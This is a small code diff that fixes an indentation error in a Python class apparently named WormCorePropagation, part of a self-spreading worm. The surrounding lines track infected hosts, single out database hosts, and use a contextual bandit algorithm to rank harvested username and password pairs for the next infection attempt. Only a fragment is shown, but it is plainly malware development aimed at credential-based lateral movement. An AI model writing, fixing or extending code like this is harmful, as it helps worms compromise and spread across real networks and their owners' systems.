@@ -75,7 +75,7 @@ class WormCorePropagation:
                     "is_database": host.get("host_type") == "database",
                     "target_count": len(self.infected_hosts),
                 }
-                    bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
+                bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
                 if bandit_cred:
                     username, password, ucb = bandit_cred
                     discovered = [(username, password)] + [
